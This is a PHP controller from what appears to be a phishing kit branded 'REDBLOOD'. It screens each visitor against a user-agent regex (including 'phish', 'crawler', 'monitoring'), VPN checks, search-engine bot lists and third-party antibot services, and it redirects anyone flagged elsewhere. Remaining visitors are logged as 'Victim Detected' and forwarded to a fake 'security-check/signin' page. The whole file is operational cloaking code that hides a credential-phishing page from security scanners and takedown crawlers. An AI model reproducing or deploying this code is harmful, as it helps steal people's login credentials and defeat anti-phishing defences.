<?php
defined("ALLOW") or exit('No direct script access allowed');

class Home
{
	public function __construct()
	{
		$this->goRBLD = new goRBLD();
		$getInfo = _geoGet($this->goRBLD->ip_address);

		foreach ($getInfo as $k => $v) {
			$_SESSION[$k] = $v;
		}
	}

	public function index()
	{

		if (preg_match("/bot|crawler|spider|aws|curl|slurp|phish|search|libwww-perl|python|archiver|transcoder|spider|uptime|validator|fetcher|cron|check|reader|extractor|monitoring|analyz/", $_SERVER['HTTP_USER_AGENT'])) {
			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Denied By Redblood\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied By Redblood\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (_config('VPNDETECT') == 'on') {
			if (REDBLOODGO($this->goRBLD->ip_address)) {
				write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Denied VPN Detected\r\n");
				write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied VPN Detected\r\n");
				_blocks();
				redirect(uriRand());
			} else if (blackbox($this->goRBLD->ip_address)) {
				write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Denied VPN Detected by Blackbox\r\n");
				write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied VPN Detected\r\n");
				_blocks();
				redirect(uriRand());
			}
		}

		if ($this->goRBLD->is_robot) {
			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Denied By Redblood\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied By Redblood\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (!isset($_GET[_config('PARAMETER')])) {
			write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Denied! Incorrect Parameter\r\n");
			write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Denied! Incorrect Parameter\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (_config('RBTOKEN') == 'on') {
			if (!empty(RBINI('TOKEN'))) {
				if (RBBLOCKER($this->goRBLD->ip_address, 'googlebot')) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Bots Detected Blocked By Redblood\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Bots Detected Blocked By Redblood\r\n");
					_blocks();
					redirect(uriRand());
				} else if (RBBLOCKER($this->goRBLD->ip_address, 'bingbot')) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Bots Detected Blocked By Redblood\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Bots Detected Blocked By Redblood\r\n");
					_blocks();
					redirect(uriRand());
				} else if (RBBLOCKER($this->goRBLD->ip_address, 'applebot')) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Bots Detected Blocked By Redblood\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Bots Detected Blocked By Redblood\r\n");
					_blocks();
					redirect(uriRand());
				} else if (RBBLOCKER($this->goRBLD->ip_address, 'yahooslurp')) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Bots Detected Blocked By Redblood\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Bots Detected Blocked By Redblood\r\n");
					_blocks();
					redirect(uriRand());
				} else if (RBBLOCKER($this->goRBLD->ip_address, 'yandexbot')) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Bots Detected Blocked By Redblood\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Bots Detected Blocked By Redblood\r\n");
					_blocks();
					redirect(uriRand());
				}
			}
		}

		if (_config('ANTIBOT') == 'on') {
			if (!empty(_antibot('KEY'))) {
				if (antibot($this->goRBLD->ip_address, $this->goRBLD->agent)) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Blocked By Antibot\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Blocked By Antibot\r\n");
					_blocks();
					redirect(uriRand());
				}
			}
		}

		if (_config('KILLBOT') == 'on') {
			if (!empty(_killbot('KEY'))) {
				if (killbot($this->goRBLD->ip_address, $this->goRBLD->agent)) {
					write(FCPATH . 'REDBLOOD/Static/log_robot.txt', 'a', "{$this->goRBLD->ip_address}|Access Blocked By Killbot\r\n");
					write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Access Blocked By Killbot\r\n");
					_blocks();
					redirect(uriRand());
				}
			}
		}

		$_SESSION['access'] = 1;
		write(FCPATH . 'REDBLOOD/Static/log_click.txt', 'a', "|{$_SESSION['flag']['img']}|" . _time() . "|{$this->goRBLD->ip_address}|{$_SESSION['country']}|{$this->goRBLD->browser}|Victim Detected\r\n");
		redirect(base_url() . 'security-check/signin?verify=rbld_' . rand(109, 100000) . '');
	}
}